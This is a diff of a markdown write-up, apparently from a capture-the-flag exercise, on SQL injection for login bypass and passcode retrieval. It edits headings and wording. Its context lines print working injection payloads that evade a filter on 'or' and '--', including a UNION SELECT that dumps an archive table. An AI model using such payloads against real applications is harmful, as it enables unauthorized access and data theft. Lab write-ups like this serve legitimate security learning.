@@ -2,14 +2,14 @@
 
 #### **Vulnerability:** SQL Injection (SQLi)
 
-------
+
 
 ## 1. Authentication Bypass
 
 **Reconnaissance:**
 
 - **Standard payload**: ` or 1=1-- -` triggered a custom error : **Input rejected by security filter.**
-- **Block**: The word `or` and standard comment characters `--`.
+- **Blocked**: The word `or` and `--`.
 
 **Exploitation:**
 
@@ -21,7 +21,7 @@ x' IS NOT '2'/*
 x' LIKE '%'/*
 ```
 
-## 2. Employee Search & Passcode Retrieval
+## 2. Passcode Retrieval
 
 **Reconnaissance:**
 
@@ -58,5 +58,6 @@ Kiwi' and Department='Management'/*
 ```sql
 x' union select *,2,3,4 from CITADEL_ARCHIVE_2077/*
 ```
+
 
 
